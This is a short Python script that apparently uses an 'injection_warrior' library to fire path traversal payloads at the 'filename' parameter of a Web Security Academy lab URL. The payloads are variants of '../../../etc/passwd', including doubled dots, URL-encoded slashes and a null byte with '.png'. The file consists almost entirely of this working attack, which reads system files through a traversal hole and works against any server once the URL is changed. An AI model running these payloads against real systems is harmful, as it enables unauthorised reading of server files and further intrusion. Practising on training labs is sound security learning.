from logging import debug
from injection_warrior import warrior

inj_war = warrior.Injector(debug=True, safe_url_chars="%00/")

url = "https://ac7a1f2c1f049b3d80eb31fd00f400c3.web-security-academy.net/image"
payloads=["/../../../etc/passwd", "/etc/passwd", '//....//....//....//etc/passwd', '..%2f..%2f..%2fetc/passwd', '/var/www/images/../../../../etc/passwd', '/../../../etc/passwd%00.png']
inj_war.inject_payload(
    url=url, 
    payloads=payloads,
    injection_point="url",
    url_params={"filename":"%$%"},
    http_method="get",
    resp_body=True,
    req_json=False,
    html=True)